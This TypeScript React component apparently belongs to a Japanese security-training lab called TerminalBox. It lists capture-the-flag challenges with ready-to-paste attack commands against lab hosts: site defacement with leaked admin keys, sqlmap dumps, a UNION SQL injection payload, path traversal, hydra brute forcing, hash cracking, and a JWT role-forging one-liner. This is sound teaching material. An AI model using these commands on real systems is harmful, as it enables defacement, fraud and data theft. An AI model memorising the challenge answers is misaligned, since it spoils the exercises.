import { useEffect, useMemo, useState } from 'react';

interface Challenge {
  id: string;
  title: string;
  goal: string;
  commands: string[];
  hint: string;
  result: string;
  answerId?: string;
}

interface ChallengeGroup {
  id: 1 | 2 | 3 | 4 | 5;
  title: string;
  subtitle: string;
  challenges: Challenge[];
}

interface Props {
  onInsertCommand: (command: string) => void;
  resetSignal: number;
  targetId: 1 | 2 | 3 | 4 | 5;
  onTargetChange: (targetId: 1 | 2 | 3 | 4 | 5) => void;
  scope: 'targets' | 'tools' | 'web-attacks';
}

const challengeGroups: ChallengeGroup[] = [
  {
    id: 1,
    title: '問題1',
    subtitle: '研修サイトの管理API',
    challenges: [
      {
        id: '01', title: '隠されたバックアップを探す',
        goal: '`robots.txt` を調べ、公開されてはいけない設定ファイルから管理APIとキーを特定してください。',
        commands: ['curl -i http://target:3000/robots.txt', 'curl http://target:3000/backup/config.json'],
        hint: '`Disallow` は検索エンジンへのお願いであり、アクセス制御ではありません。',
        result: '設定JSONに `adminApi` と `adminKey` が表示されれば調査成功です。',
      },
      {
        id: '02', title: 'トップページを改ざんする', goal: '漏えいしたキーで管理APIを呼び、見出しと配色を変更してください。',
        commands: ["curl -X POST http://target:3000/api/admin/banner -H 'Content-Type: application/json' -H 'X-Admin-Key: training-admin-2026' -d '{\"headline\":\"演習サイトは改ざんされました\",\"theme\":\"compromised\"}'"],
        hint: 'JSONを送るときは `Content-Type`、認証値は `X-Admin-Key` ヘッダーに指定します。',
        result: '左下のサイトが赤くなり、見出しが「演習サイトは改ざんされました」になれば成功です。',
      },
      {
        id: '03', title: '偽のメンテナンス画面にする', goal: '同じ脆弱なAPIから、サイトをメンテナンス表示へ切り替えてください。',
        commands: ["curl -X POST http://target:3000/api/admin/banner -H 'Content-Type: application/json' -H 'X-Admin-Key: training-admin-2026' -d '{\"headline\":\"システムメンテナンス中\",\"theme\":\"maintenance\"}'"],
        hint: '攻撃者が管理機能を使えると、偽のお知らせや誘導画面にも悪用できます。',
        result: '左下のサイトが黄色のメンテナンス表示へ変われば成功です。',
      },
      {
        id: '04', title: '偽の緊急メッセージを掲示する', goal: '漏えいしたキーを使い、トップページへ任意の緊急メッセージを追加してください。',
        commands: ["curl -X POST http://target:3000/api/admin/notice -H 'Content-Type: application/json' -H 'X-Admin-Key: training-admin-2026' -d '{\"notice\":\"直ちにパスワードを変更してください\"}'"],
        hint: '管理APIで更新できる項目が多いほど、キー漏えい時の被害も広がります。',
        result: '左下のサイトに赤い緊急メッセージが追加されれば成功です。',
      },
      {
        id: '05', title: '改ざん状態を確認する', goal: 'APIから現在の改ざん状態を取得し、画面とレスポンスが一致するか確認してください。',
        commands: ['curl -s http://target:3000/api/status'], hint: '見た目だけでなく、APIの状態も証拠として記録します。',
        result: '`modified` が `true` で、現在のサイト状態がJSONに含まれていれば成功です。',
      },
    ],
  },
  {
    id: 2,
    title: '問題2',
    subtitle: 'オンラインストアの商品管理',
    challenges: [
      {
        id: '01', title: 'ストアの非公開設定を探す', goal: '`robots.txt` を手掛かりに、バックアップされたストア設定を見つけてください。',
        commands: ['curl -i http://target2:3000/robots.txt', 'curl http://target2:3000/backup/store-config.json'],
        hint: 'バックアップファイルも公開ディレクトリに置けば、URLを知る人から取得できます。',
        result: '`productApi`、`campaignApi`、`adminKey` が確認できれば成功です。',
      },
      {
        id: '02', title: '商品情報を書き換える', goal: '漏えいした管理キーを使い、おすすめ商品の名称・価格・在庫数を変更してください。',
        commands: ["curl -X POST http://target2:3000/api/admin/product -H 'Content-Type: application/json' -H 'X-Admin-Key: store-admin-2026' -d '{\"product\":\"特別セール商品\",\"price\":100,\"stock\":999}'"],
        hint: '価格や在庫の更新APIが適切に保護されていないと、販売情報を任意に変更されます。',
        result: '左下の商品名が「特別セール商品」、価格が100円、在庫が999になれば成功です。',
      },
      {
        id: '03', title: '偽のキャンペーンを掲載する', goal: '管理APIから、利用者を急がせる偽のキャンペーン告知を掲載してください。',
        commands: ["curl -X POST http://target2:3000/api/admin/campaign -H 'Content-Type: application/json' -H 'X-Admin-Key: store-admin-2026' -d '{\"notice\":\"本日限定・全商品90%OFF\"}'"],
        hint: '表示内容の改ざんは、詐欺的な誘導やブランド毀損につながります。',
        result: 'ストア上部に赤いキャンペーン告知が表示されれば成功です。',
      },
      {
        id: '04', title: 'ストアの改ざん状態を確認する', goal: '状態APIを取得し、変更後の商品情報をJSONでも確認してください。',
        commands: ['curl -s http://target2:3000/api/status'], hint: 'レスポンスの `site` に画面と同じ値があるか比較します。',
        result: '`service` が `terminalbox-target-2`、`modified` が `true` なら成功です。',
      },
    ],
  },
  {
    id: 3,
    title: '問題3',
    subtitle: '図書館サイトのデバッグ設定',
    challenges: [
      {
        id: '01', title: 'デバッグ設定の漏えいを調べる', goal: '`robots.txt` から、公開されたデバッグ設定と管理キーを発見してください。',
        commands: ['curl -i http://target3:3000/robots.txt', 'curl http://target3:3000/debug/app-config.json'],
        hint: 'デバッグ用ファイルには、本番で不要な接続先や秘密情報を残さないことが重要です。',
        result: '`heroApi`、`alertApi`、`adminKey` が表示されれば成功です。',
      },
      {
        id: '02', title: '図書館の見出しを改ざんする', goal: '漏えいしたキーを使い、公式サイトの見出しとテーマを変更してください。',
        commands: ["curl -X POST http://target3:3000/api/admin/hero -H 'Content-Type: application/json' -H 'X-Admin-Key: library-admin-2026' -d '{\"headline\":\"図書館サイトは改ざんされました\",\"theme\":\"compromised\"}'"],
        hint: '公式情報を表示するAPIほど、認証情報の管理と操作記録が重要になります。',
        result: '左下の図書館サイトが赤い警告テーマへ変われば成功です。',
      },
      {
        id: '03', title: '偽の休館案内を掲示する', goal: 'お知らせAPIを悪用し、偽の臨時休館メッセージを表示してください。',
        commands: ["curl -X POST http://target3:3000/api/admin/alert -H 'Content-Type: application/json' -H 'X-Admin-Key: library-admin-2026' -d '{\"notice\":\"本日は臨時休館です\"}'"],
        hint: '公共情報の改ざんは、利用者の行動へ直接影響します。',
        result: '図書館サイトに「本日は臨時休館です」と表示されれば成功です。',
      },
      {
        id: '04', title: '図書館サイトの状態を確認する', goal: 'APIレスポンスから、表示中の改ざん内容を確認してください。',
        commands: ['curl -s http://target3:3000/api/status'], hint: '`profile` と `site` の内容から対象と変更内容を確認します。',
        result: '`service` が `terminalbox-target-3`、`modified` が `true` なら成功です。',
      },
    ],
  },
  {
    id: 4,
    title: '問題4',
    subtitle: 'セキュリティツール実践ラボ',
    challenges: [
      {
        id: '01', title: 'Burp Suite Community', answerId: 'burp',
        goal: 'Kali DesktopでBurp Suiteを起動し、FirefoxのHTTP Proxyを `127.0.0.1:8080` に設定します。割引申請を捕捉してRepeaterへ送り、`discount`を書き換えてFlagを取得してください。',
        commands: ['firefox http://labtarget:3100/burp/'],
        hint: 'Applications → Web Application Analysis → burpsuite から起動し、Temporary project → Use Burp defaults を選びます。Proxy → Interceptで「Intercept is on」を確認し、Firefoxの設定 → Network SettingsでManual proxyを選択してHTTP Proxyを127.0.0.1、Portを8080にします。Firefoxで割引申請を送るとBurpにリクエストが止まるので、右クリックしてSend to Repeaterを選びます。Repeaterで本文のhiddenパラメータ `discount` を90へ変更してSendを押し、右側のレスポンスに出る `TBX{...}` を確認します。',
        result: 'レスポンスに表示された `TBX{...}` を回答欄へ入力します。',
      },
      {
        id: '02', title: 'Wireshark / tshark', answerId: 'wireshark',
        goal: '配布PCAPからHTTPリクエストを調べ、`X-Training-Flag` ヘッダーを発見してください。Cloud版でも利用できるオフライン解析問題です。',
        commands: ["tshark -r ~/TerminalBox-Labs/capture.pcapng -Y http -V | grep -i -A2 'training-flag'", 'wireshark ~/TerminalBox-Labs/capture.pcapng'],
        hint: 'Applications → Sniffing - Spoofing → wireshark から起動し、File → Openで `~/TerminalBox-Labs/capture.pcapng` を開きます。上部の表示フィルターへ `http` と入力してEnterを押し、残ったパケットを選択します。中央ペインのHypertext Transfer Protocolを展開し、`X-Training-Flag` ヘッダーの値を探します。GUIが使えない場合は提示コマンドの `-r` がPCAP読込、`-Y http` がHTTPだけの表示、`-V` が詳細表示です。',
        result: '`X-Training-Flag` の値を回答します。',
      },
      {
        id: '03', title: 'Gobuster', answerId: 'gobuster',
        goal: '専用辞書を使って公開されていないディレクトリとFlagファイルを発見してください。',
        commands: ['gobuster dir -u http://labtarget:3100 -w ~/TerminalBox-Labs/directories.txt -x txt', 'curl http://labtarget:3100/internal-backup/flag.txt'],
        hint: 'Applications → Web Application Analysis → gobuster からターミナル版を起動するか、提示コマンドを実行します。`dir` はディレクトリ探索、`-u` は対象URL、`-w` は候補辞書、`-x txt` は各候補へ `.txt` も追加して調べる指定です。結果のStatus 200または301の行から隠しディレクトリ名を確認し、その配下の `flag.txt` をブラウザーまたは `curl` で開きます。探索はこの演習用URLと配布辞書だけに限定してください。',
        result: '発見したファイル内の `TBX{...}` を回答します。',
      },
      {
        id: '04', title: 'Nikto', answerId: 'nikto',
        goal: 'Webサーバーをスキャンし、公開されたサーバーステータスと危険なHTTP設定を確認してください。',
        commands: ['nikto -h http://labtarget:3100 -maxtime 2m', 'curl http://labtarget:3100/server-status'],
        hint: 'Applications → Vulnerability Analysis → nikto から起動するか、提示コマンドを実行します。`-h` は検査対象、`-maxtime 2m` は最長2分で終了する指定です。出力を上から読み、`/server-status` が公開されているという行と、許可されている危険なHTTPメソッドの指摘を確認します。その後 `curl http://labtarget:3100/server-status` で実際の公開ページを取得し、ページ内の `TBX{...}` を探します。',
        result: 'サーバーステータスにある `TBX{...}` を回答します。',
      },
      {
        id: '05', title: 'sqlmap', answerId: 'sqlmap',
        goal: '商品検索の `q` パラメータを検査し、SQLiteの `secrets` テーブルからFlagを取得してください。',
        commands: ["sqlmap -u 'http://labtarget:3100/sql/search?q=apple' -p q --dbms=SQLite --batch --tables", "sqlmap -u 'http://labtarget:3100/sql/search?q=apple' -p q --dbms=SQLite --batch -T secrets --dump"],
        hint: 'Applications → Database Assessment → sqlmap から起動するか、1本目の提示コマンドを実行します。`-u` は検査するURL、`-p q` は `q` パラメータだけを検査、`--dbms=SQLite` はDB種別、`--batch` は質問へ既定値で自動回答する指定です。`--tables` の結果に `secrets` があることを確認したら、2本目の `-T secrets --dump` でそのテーブルだけを表示します。表示された行の `training_flag` 列を回答します。',
        result: '`training_flag` の値を回答します。',
      },
      {
        id: '06', title: 'John the Ripper', answerId: 'john',
        goal: 'raw MD5形式の漏えいハッシュを専用辞書で復元してください。',
        commands: ['john --format=raw-md5 --wordlist=~/TerminalBox-Labs/passwords.txt ~/TerminalBox-Labs/john.hash', 'john --show --format=raw-md5 ~/TerminalBox-Labs/john.hash'],
        hint: 'Applications → Password Attacks → john から起動するか、1本目の提示コマンドを実行します。`--format=raw-md5` はハッシュ形式、`--wordlist` は試す候補語のファイル、最後の引数は解析対象のハッシュファイルです。完了後に2本目の `john --show` を実行すると `ユーザー名:平文パスワード` の形式で結果を再表示できます。解答欄には `TBX{...}` ではなく、復元された平文パスワードだけを入力します。',
        result: '復元したパスワードを回答します。',
      },
      {
        id: '07', title: 'Hashcat', answerId: 'hashcat',
        goal: 'SHA-256ハッシュを辞書攻撃で復元してください。GPUを使わず、短時間で終わる教材です。',
        commands: ['hashcat -m 1400 -a 0 ~/TerminalBox-Labs/hashcat.sha256 ~/TerminalBox-Labs/passwords.txt --potfile-path ~/TerminalBox-Labs/hashcat.pot', 'hashcat -m 1400 ~/TerminalBox-Labs/hashcat.sha256 --show --potfile-path ~/TerminalBox-Labs/hashcat.pot'],
        hint: 'Applications → Password Attacks → hashcat から起動するか、1本目の提示コマンドを実行します。`-m 1400` はSHA-256、`-a 0` は辞書攻撃で、ハッシュファイルの各値に対して配布辞書の候補を試します。`--potfile-path` には復元結果が保存されるため、再実行時にも同じファイルを指定してください。解析後に2本目の `--show` を実行し、`ハッシュ:平文パスワード` のコロンより後ろを回答します。',
        result: '復元したパスワードを回答します。',
      },
      {
        id: '08', title: 'Netcat', answerId: 'netcat',
        goal: 'TCPサービスへ接続し、表示された独自プロトコルの指示に従ってFlagを取得してください。',
        commands: ["printf 'FLAG PLEASE\\n' | nc labtarget 4100"],
        hint: 'Applications → Information Gathering → netcat からターミナル版を起動するか、まず `nc labtarget 4100` を実行します。接続後に表示される案内を読み、`FLAG PLEASE` と入力してEnterを押してください。提示コマンドは `printf` で同じ文字列と改行を作り、パイプ `|` でNetcatへ渡す一括実行版です。接続先はWebページではなく生のTCPサービスなので、URLの `http://` は付けません。',
        result: 'TCPサービスが返した `TBX{...}` を回答します。',
      },
      {
        id: '09', title: 'Hydra', answerId: 'hydra',
        goal: 'ユーザー `analyst` のパスワードを小さな専用辞書で検証し、ログイン後のFlagを取得してください。',
        commands: ["hydra -l analyst -P ~/TerminalBox-Labs/hydra-passwords.txt labtarget -s 3100 http-post-form '/hydra/login:username=^USER^&password=^PASS^:F=Invalid credentials' -t 2 -f", "curl -d 'username=analyst&password=bluebird' http://labtarget:3100/hydra/login"],
        hint: 'Applications → Password Attacks → hydra から起動するか、1本目の提示コマンドを実行します。`-l analyst` は固定ユーザー、`-P` はパスワード辞書、`-s 3100` は接続ポート、`http-post-form` の文字列は送信先・フォーム項目・失敗時の文言を表します。`^USER^` と `^PASS^` はHydraが候補へ置換し、`-t 2` は同時試行2件、`-f` は発見時に終了する指定です。成功行でパスワードが `bluebird` と分かったら、2本目のcurlを実行してログインレスポンスのFlagを取得します。',
        result: 'ログイン成功レスポンスの `TBX{...}` を回答します。',
      },
      {
        id: '10', title: 'Metasploit Framework', answerId: 'metasploit',
        goal: 'TerminalBox専用Auxiliary Scannerを実行し、TargetからFlagを取得してください。',
        commands: ['msfconsole -q -x "use auxiliary/scanner/http/terminalbox_flag; set RHOSTS labtarget; set RPORT 3100; run; exit -y"'],
        hint: 'Applications → Exploit Frameworks → metasploit-framework から `msfconsole` を起動できます。対話操作する場合は `use auxiliary/scanner/http/terminalbox_flag` で専用Scannerを選択し、`set RHOSTS labtarget`、`set RPORT 3100`、`run` の順に入力します。提示コマンドの `-q` はバナーを省略し、`-x` はこの一連の操作を自動実行する指定です。結果の `[+]` で始まる成功行から `TBX{...}` を確認します。この教材はpayloadやreverse shellを使わず、演習環境内のHTTP Scannerだけを実行します。',
        result: '`[+]` の行に表示された `TBX{...}` を回答します。',
      },
    ],
  },
  {
    id: 5,
    title: '問題5',
    subtitle: 'Web Attacks 初級',
    challenges: [
      {
        id: '01', title: 'Parameter Tampering', answerId: 'web-parameter',
        goal: 'TBX Marketの商品購入リクエストを観察し、割引率を改変して研修用Flagを取得してください。',
        commands: ["curl -X POST -d 'product=1&discount=10' http://labtarget:3100/web-attacks/buy", "curl -X POST -d 'product=1&discount=90' http://labtarget:3100/web-attacks/buy"],
        hint: 'まず1本目で通常購入のレスポンスを確認します。次に、送信される `discount` はブラウザー側のhidden項目にすぎない点に注目してください。Burp Repeaterを使う場合は購入POSTを捕捉し、割引率だけを90へ変更して再送します。Terminalでは2本目のcurlが同じ操作です。成功レスポンス内の `TBX{...}` を回答欄へ入力します。',
        result: '90%の研修割引が適用され、レスポンスに `TBX{...}` が表示されます。',
      },
      {
        id: '02', title: 'IDOR / Broken Access Control', answerId: 'web-idor',
        goal: 'プロフィールのユーザーIDを変更し、管理者プロフィールに残された研修用Flagを見つけてください。',
        commands: ["curl 'http://labtarget:3100/web-attacks/profile?id=1001'", "curl 'http://labtarget:3100/web-attacks/profile?id=1003'"],
        hint: '最初のコマンドで自分のプロフィールを取得し、URLの `id=1001` が表示対象を決めていることを確認します。連番になっているIDを少しずつ変更して、別ユーザーの情報が認可確認なしで返るか比べます。管理者に相当するプロフィールの研修メモにある `TBX{...}` を回答してください。',
        result: '管理者プロフィールの研修メモから `TBX{...}` を確認できます。',
      },
      {
        id: '03', title: 'SQL Injection', answerId: 'web-sqli',
        goal: '商品検索の文字列がSQLへ安全に渡されているか調べ、研修用テーブルからFlagを取得してください。',
        commands: ["curl -G http://labtarget:3100/web-attacks/search --data-urlencode 'q=apple'", "curl -G http://labtarget:3100/web-attacks/search --data-urlencode \"q=' UNION SELECT id,label,value FROM training_secrets--\""],
        hint: 'まず通常検索のJSON構造を確認します。次に、検索語の末尾へシングルクォートを入れたときの挙動から、入力がSQL文へ連結されている可能性を考えます。2本目は元のSELECTと同じ3列になるよう `UNION SELECT` を組み、研修専用の `training_secrets` を参照します。結果行のvalueにある `TBX{...}` を回答します。',
        result: '検索結果JSONに研修用secretの `TBX{...}` が追加されます。',
      },
      {
        id: '04', title: 'Stored XSS（安全な模擬）', answerId: 'web-xss',
        goal: 'コメントへ研修用マーカーを保存し、安全な模擬検出結果からFlagを取得してください。スクリプトは実行されません。',
        commands: ["curl -X POST -d 'author=student&comment=通常コメント' http://labtarget:3100/web-attacks/comments", "curl -X POST -d 'author=student' --data-urlencode 'comment=<script>training()</script>' http://labtarget:3100/web-attacks/comments", "curl http://labtarget:3100/web-attacks/comments"],
        hint: 'まず1本目で通常コメントを投稿し、COMMENTS画面または3本目のcurlで保存後も表示されることを確認します。次に2本目で研修専用のscriptマーカーを投稿し、もう一度COMMENTSを取得します。サーバーは入力をDBへ保存しますが、表示時にはHTMLをエスケープし、JavaScriptを一切実行しません。保存文字列の近くに出る安全な検出通知から `TBX{...}` を探し、回答欄へ入力してください。',
        result: '入力は文字列として表示され、安全な模擬検出通知に `TBX{...}` が現れます。',
      },
      {
        id: '05', title: 'Path Traversal（仮想ファイル）', answerId: 'web-traversal',
        goal: 'FILES機能の相対パス処理を調べ、仮想ファイル領域の研修メモを取得してください。実ファイルは読みません。',
        commands: ["curl 'http://labtarget:3100/web-attacks/files?name=manual.txt'", "curl 'http://labtarget:3100/web-attacks/files?name=../private/training-note.txt'"],
        hint: 'まず公開ファイル名を指定し、`name` が読み込み対象を決めていることを確認します。次に `../` を使ってpublicの一つ上を表すパスを試します。この演習は辞書で定義した仮想ファイルだけを返すため、OS上のパスには到達しません。研修メモ内の `TBX{...}` を回答します。',
        result: '仮想のprivate研修メモから `TBX{...}` を確認できます。',
      },
      {
        id: '06', title: 'Unrestricted File Upload（安全な模擬）', answerId: 'web-upload',
        goal: '許可されるべきでない拡張子のファイルを送り、アップロード検証の不足を確認してください。内容は保存・実行されません。',
        commands: ["printf 'normal image metadata' > /tmp/profile.txt", "curl -F 'file=@/tmp/profile.txt;type=text/plain' http://labtarget:3100/web-attacks/upload", "printf 'training only' > /tmp/training.php", "curl -F 'file=@/tmp/training.php;type=application/x-php' http://labtarget:3100/web-attacks/upload"],
        hint: 'まず1本目で通常ファイルを作り、2本目の `curl -F` で送信して、Flagのない保存結果を確認します。次に3本目で内容が無害なまま危険な拡張子を持つ教材ファイルを作ります。4本目はmultipart/form-dataでそのファイル名とContent-Typeを送ります。サーバーは内容を破棄し、名前・種別・サイズだけをメモリDBへ記録します。危険な形式を不適切に受理したJSONから `TBX{...}` を探し、回答してください。',
        result: 'レスポンスは `executed: false` を示し、検証不足を表す `TBX{...}` を返します。',
      },
      {
        id: '07', title: 'SSRF（通信しない模擬）', answerId: 'web-ssrf',
        goal: 'URLプレビューへ内部向けURLを指定し、模擬内部ルートのFlagを取得してください。外部通信は行われません。',
        commands: ["curl -G http://labtarget:3100/web-attacks/preview --data-urlencode 'url=https://market.tbx/products'", "curl -G http://labtarget:3100/web-attacks/preview --data-urlencode 'url=http://internal.tbx/admin'"],
        hint: '1本目で事前定義された公開URLの模擬結果を確認します。次にホスト名を内部サービス用のものへ変更します。サーバーは入力URLへ接続せず、完全一致する教材ルートだけをローカルの固定レスポンスへ割り当てます。`source` が模擬内部ルートを示すJSON内の `TBX{...}` を回答してください。',
        result: '外部通信なしで、模擬内部サービスのJSONに `TBX{...}` が表示されます。',
      },
      {
        id: '08', title: 'Broken Authentication / JWT', answerId: 'web-jwt',
        goal: '署名されていない研修トークンのroleを書き換え、管理者APIへアクセスしてください。',
        commands: ["curl -X POST -d 'username=student&password=market123' http://labtarget:3100/web-attacks/login", "python3 -c \"import base64,json; t=input('token: ').strip(); p=json.loads(base64.urlsafe_b64decode(t+'='*(-len(t)%4))); p['role']='admin'; print(base64.urlsafe_b64encode(json.dumps(p,separators=(',',':')).encode()).decode().rstrip('='))\"", "curl -H 'Authorization: Bearer 変更後のトークン' http://labtarget:3100/web-attacks/admin"],
        hint: '1本目のレスポンスからtokenをコピーします。2本目を実行してtokenを貼り付けると、Base64URLのJSONを復号し、`role` だけをadminへ変えた新しいtokenが表示されます。3本目の日本語部分をその値へ置き換えて送信します。署名検証がないため改変が受理され、管理者レスポンスの `TBX{...}` を取得できます。RESET後はnonceが変わり、古いtokenは無効になります。',
        result: 'roleを改変した現行トークンで、管理者APIから `TBX{...}` を取得できます。',
      },
    ],
  },
];

const STORAGE_KEY = 'terminalbox:challenge-completed';

function loadCompleted() {
  try {
    const parsed = JSON.parse(window.localStorage.getItem(STORAGE_KEY) ?? '[]');
    if (!Array.isArray(parsed)) return [];
    return parsed.filter((id): id is string => typeof id === 'string').map((id) => id.includes(':') ? id : `1:${id}`);
  } catch { return []; }
}

export function ChallengePanel({ onInsertCommand, resetSignal, targetId, onTargetChange, scope }: Props) {
  const availableGroups = scope === 'tools'
    ? challengeGroups.filter((item) => item.id === 4)
    : scope === 'web-attacks'
      ? challengeGroups.filter((item) => item.id === 5)
      : challengeGroups.filter((item) => item.id <= 3);
  const group = availableGroups.find((item) => item.id === targetId) ?? availableGroups[0];
  const [selectedId, setSelectedId] = useState(group.challenges[0].id);
  const [queuedCommand, setQueuedCommand] = useState<string | null>(null);
  const [completedIds, setCompletedIds] = useState<string[]>(loadCompleted);
  const [answer, setAnswer] = useState('');
  const [checking, setChecking] = useState(false);
  const [feedback, setFeedback] = useState('');
  const [hintVisible, setHintVisible] = useState(false);
  const completedSet = useMemo(() => new Set(completedIds), [completedIds]);
  const challenge = group.challenges.find((item) => item.id === selectedId) ?? group.challenges[0];
  const completionId = `${group.id}:${challenge.id}`;
  const completed = completedSet.has(completionId);
  const groupCompleted = group.challenges.filter((item) => completedSet.has(`${group.id}:${item.id}`)).length;

  useEffect(() => window.localStorage.setItem(STORAGE_KEY, JSON.stringify(completedIds)), [completedIds]);
  useEffect(() => { setSelectedId(group.challenges[0].id); setQueuedCommand(null); setAnswer(''); setFeedback(''); }, [group]);
  useEffect(() => { setSelectedId(group.challenges[0].id); setCompletedIds(loadCompleted()); setAnswer(''); setFeedback(''); }, [group, resetSignal]);
  useEffect(() => setHintVisible(false), [selectedId, resetSignal]);

  const queueCommand = (command: string) => {
    onInsertCommand(command);
    setQueuedCommand(command);
    window.setTimeout(() => setQueuedCommand((current) => current === command ? null : current), 1400);
  };

  const checkAnswer = async () => {
    if (!challenge.answerId || !answer.trim()) return;
    setChecking(true);
    setFeedback('');
    try {
      const response = await fetch('/api/challenges/check', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ id: challenge.answerId, answer }),
      });
      const result = await response.json();
      if (!response.ok) throw new Error(result.error || `HTTP ${response.status}`);
      setFeedback(result.message);
      if (result.correct) {
        setCompletedIds((current) => current.includes(completionId) ? current : [...current, completionId]);
      }
    } catch (error) {
      setFeedback(error instanceof Error ? error.message : '回答の確認に失敗しました。');
    } finally {
      setChecking(false);
    }
  };

  const clearChallenge = () => {
    setCompletedIds((current) => current.filter((id) => id !== completionId));
    setAnswer('');
    setFeedback('');
  };

  return (
    <section className="panel tutorial-panel challenge-panel" id="challenge-panel" role="tabpanel" aria-labelledby={scope === 'tools' ? 'tools-tab' : scope === 'web-attacks' ? 'web-attacks-tab' : 'targets-tab'}>
      <div className="panel-heading">
        <div><span className="eyebrow">{scope === 'tools' ? 'SECURITY TOOL MISSIONS' : scope === 'web-attacks' ? 'WEB ATTACK MISSIONS' : 'TARGET MISSIONS'}</span><h2>{group.subtitle}</h2></div>
        <span className="ai-badge">{groupCompleted}/{group.challenges.length} CLEAR</span>
      </div>
      {scope === 'targets' && <div className="challenge-target-tabs" role="tablist" aria-label="ターゲット問題を選択">
        {availableGroups.map((item) => (
          <button key={item.id} type="button" role="tab" aria-selected={item.id === targetId} className={item.id === targetId ? 'active' : ''} onClick={() => onTargetChange(item.id)}>
            {item.title}
          </button>
        ))}
      </div>}
      <div className="tutorial-body">
        <nav className="lesson-list" aria-label={`${group.title}の一覧`}>
          {group.challenges.map((item) => {
            const itemCompletionId = `${group.id}:${item.id}`;
            return (
              <button key={item.id} type="button" className={`${item.id === selectedId ? 'active' : ''} ${completedSet.has(itemCompletionId) ? 'completed' : ''}`} onClick={() => { setSelectedId(item.id); setAnswer(''); setFeedback(''); }}>
                <span>{completedSet.has(itemCompletionId) ? '✓' : item.id}</span>{item.title}
              </button>
            );
          })}
        </nav>
        <article className="lesson-detail">
          <div className="lesson-title-row">
            <div><span className="eyebrow">{group.title.toUpperCase()} / QUESTION {challenge.id}</span><h3>{challenge.title}</h3></div>
            <div className="lesson-title-status">
              {scope !== 'targets' && <button type="button" className="lesson-clear-button" disabled={!completed} onClick={clearChallenge}>クリア解除</button>}
              <span className={`lesson-clear-badge ${completed ? 'cleared' : ''}`}>{completed ? 'クリア済み' : '未クリア'}</span>
            </div>
          </div>
          <p>{challenge.goal}</p>
          {challenge.answerId ? (
            <div className="challenge-answer">
              <input aria-label="問題の回答" value={answer} disabled={completed || checking} placeholder="Flagまたは復元したパスワード" onChange={(event) => setAnswer(event.target.value)} onKeyDown={(event) => { if (event.key === 'Enter') void checkAnswer(); }} />
              <button type="button" disabled={completed || checking || !answer.trim()} onClick={() => void checkAnswer()}>{checking ? '確認中...' : completed ? '正解' : '回答する'}</button>
              {feedback && <p className={completed ? 'correct' : 'incorrect'} role="status">{feedback}</p>}
            </div>
          ) : (
            <div className="lesson-actions">
              <button type="button" disabled={completed} onClick={() => setCompletedIds((current) => current.includes(completionId) ? current : [...current, completionId])}>クリアにする</button>
              <button type="button" className="secondary" disabled={!completed} onClick={clearChallenge}>クリア解除</button>
            </div>
          )}
          <div className="command-stack" aria-label="問題で使うコマンド">
            {challenge.commands.map((command) => (
              <button key={command} type="button" onClick={() => queueCommand(command)}><code>{command}</code><span>{queuedCommand === command ? 'PASTED' : 'PASTE'}</span></button>
            ))}
          </div>
          <button type="button" className="hint-toggle" aria-expanded={hintVisible} onClick={() => setHintVisible((current) => !current)}>
            <span>HINT</span><strong>{hintVisible ? 'ヒントを隠す' : 'ヒントを表示'}</strong>
          </button>
          {hintVisible && <div className="lesson-card lesson-hint"><p>{challenge.hint}</p></div>}
          <div className="lesson-card lesson-check"><span>CHECK</span><p>{challenge.result}</p></div>
        </article>
      </div>
    </section>
  );
}
